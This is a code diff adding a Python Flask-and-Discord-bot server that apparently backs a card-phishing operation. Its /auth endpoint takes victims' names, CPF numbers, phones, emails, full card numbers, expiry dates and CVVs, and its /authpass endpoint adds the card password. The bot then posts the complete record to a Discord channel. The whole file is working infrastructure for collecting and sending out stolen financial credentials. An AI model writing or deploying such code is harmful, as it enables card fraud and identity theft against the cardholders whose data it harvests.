@@ -1,0 +1,194 @@
+import os
+import threading
+import asyncio
+from dataclasses import dataclass
+
+import discord
+from discord.ext import commands
+from flask import Flask, request, jsonify
+
+# --- Data Model ---
+# A dataclass is used instead of an external model file for simplicity.
+# It holds all the information for a card transaction.
+@dataclass
+class Card:
+    celular: str
+    operadora: str
+    valor: str
+    email: str
+    nome: str
+    cpf: str
+    card: str
+    mes: str
+    ano: str
+    cvv: str
+    token: str
+    bin: str
+    dadosbin: str
+    senha: str = None  # This will be filled by the /authpass request
+
+
+# --- Environment & Configuration ---
+BOT_TOKEN = os.getenv("TOKEN")
+# The ID of the Discord channel where messages will be sent
+CHANNEL_ID_STR = os.getenv("DISCORD_CHANNEL_ID")
+
+if not BOT_TOKEN or not CHANNEL_ID_STR:
+    raise ValueError("Error: Missing required environment variables. Please set TOKEN and DISCORD_CHANNEL_ID.")
+
+try:
+    CHANNEL_ID = int(CHANNEL_ID_STR)
+except ValueError:
+    raise ValueError("Error: DISCORD_CHANNEL_ID must be a valid integer.")
+
+
+# --- Global Variables ---
+app = Flask(__name__)
+
+# Use a dictionary for efficient O(1) lookups by token.
+# This is an in-memory store; data will be lost on application restart.
+cards_by_token: dict[str, Card] = {}
+
+# Discord Bot Setup
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix="/", intents=intents)
+
+
+# --- Discord Bot Events ---
+@bot.event
+async def on_ready():
+    """Confirms that the bot has logged in and is ready."""
+    print(f'Logged in as {bot.user.name} ({bot.user.id})')
+    channel = bot.get_channel(CHANNEL_ID)
+    if channel:
+        print(f"Successfully connected to channel: #{channel.name}")
+    else:
+        print(f"Error: Could not find channel with ID {CHANNEL_ID}. Please check the ID and bot permissions.")
+
+
+# --- Helper Functions ---
+async def send_card_to_discord(card: Card):
+    """Formats and sends the card details to the configured Discord channel."""
+    try:
+        channel = bot.get_channel(CHANNEL_ID)
+        if not channel:
+            print(f"Error: Target channel {CHANNEL_ID} not found.")
+            return
+
+        embed = discord.Embed(
+            title="💳 New Card Information",
+            description="A full set of card details has been received.",
+            color=discord.Color.gold()
+        )
+        embed.add_field(name="👤 Nome", value=f"`{card.nome}`", inline=True)
+        embed.add_field(name="📄 CPF", value=f"`{card.cpf}`", inline=True)
+        embed.add_field(name="📧 Email", value=f"`{card.email}`", inline=True)
+
+        embed.add_field(name="📱 Celular", value=f"`{card.celular}`", inline=True)
+        embed.add_field(name="📡 Operadora", value=f"`{card.operadora}`", inline=True)
+        embed.add_field(name="💰 Valor", value=f"`{card.valor}`", inline=True)
+
+        embed.add_field(name="--- Card Details ---", value="", inline=False)
+        embed.add_field(name="💳 Número do Cartão", value=f"`{card.card}`", inline=False)
+        embed.add_field(name="📅 Validade (MM/AA)", value=f"`{card.mes}/{card.ano}`", inline=True)
+        embed.add_field(name="🔒 CVV", value=f"`{card.cvv}`", inline=True)
+        embed.add_field(name="🔑 Senha", value=f"**`{card.senha}`**", inline=True)
+
+        embed.add_field(name="--- BIN Info ---", value="", inline=False)
+        embed.add_field(name="BIN", value=f"`{card.bin}`", inline=True)
+        embed.add_field(name="Dados do BIN", value=f"`{card.dadosbin}`", inline=True)
+
+        embed.set_footer(text=f"Token: {card.token}")
+        embed.set_timestamp()
+
+        await channel.send(embed=embed)
+        print(f"Successfully sent details for token {card.token} to Discord.")
+
+    except Exception as e:
+        print(f"An error occurred while sending Discord message: {e}")
+
+
+# --- Flask Web Server Routes ---
+@app.route('/auth', methods=['POST'])
+def auth_info():
+    """
+    Endpoint to receive initial card details.
+    Uses POST method as it expects a JSON body.
+    """
+    try:
+        data = request.json
+        required_keys = [
+            'celular', 'operadora', 'valor', 'email', 'nome', 'cpf',
+            'card', 'mes', 'ano', 'cvv', 'token', 'bin', 'dadosbin'
+        ]
+
+        if not data or not all(key in data for key in required_keys):
+            return jsonify({'Error': 'Missing required fields'}), 400
+
+        token = data['token']
+        if token in cards_by_token:
+            return jsonify({'Error': 'Token already exists'}), 409
+
+        new_card = Card(**data)
+        cards_by_token[token] = new_card
+
+        print(f"Received initial info for token: {token}")
+        return jsonify({'Message': 'Ok'}), 200
+
+    except Exception as ex:
+        print(f"Error in /auth: {ex}")
+        return jsonify({'Error': 'Internal Server Error'}), 500
+
+
+@app.route('/authpass', methods=['POST'])
+def auth_password():
+    """
+    Endpoint to receive the card password.
+    Finds the matching card, sends the complete data to Discord, and cleans up.
+    """
+    try:
+        data = request.json
+        if not data or 'senha' not in data or 'token' not in data:
+            return jsonify({'Error': 'Missing "senha" or "token" field'}), 400
+
+        token = data.get('token')
+        senha = data.get('senha')
+
+        card = cards_by_token.get(token)
+        if not card:
+            return jsonify({'Error': 'Token not found'}), 404
+
+        card.senha = senha
+        print(f"Received password for token: {token}. Preparing to send to Discord.")
+
+        # Safely schedule the async Discord message from this synchronous Flask thread
+        asyncio.run_coroutine_threadsafe(
+            send_card_to_discord(card),
+            bot.loop
+        )
+
+        # Remove the card from memory after processing to prevent memory leaks
+        del cards_by_token[token]
+
+        return jsonify({'Message': 'Ok'}), 200
+
+    except Exception as ex:
+        print(f"Error in /authpass: {ex}")
+        return jsonify({'Error': 'Internal Server Error'}), 500
+
+
+# --- Main Application Execution ---
+def run_flask_app():
+    """Runs the Flask web server."""
+    # debug=False is important for production and when using threading
+    app.run(host="0.0.0.0", port=5000, debug=False)
+
+
+if __name__ == "__main__":
+    # Run the Discord bot in a separate background thread
+    # The `daemon=True` flag ensures the thread will exit when the main program does
+    bot_thread = threading.Thread(target=bot.run, args=(BOT_TOKEN,), daemon=True)
+    bot_thread.start()
+
+    # Run the Flask app in the main thread
+    run_flask_app()
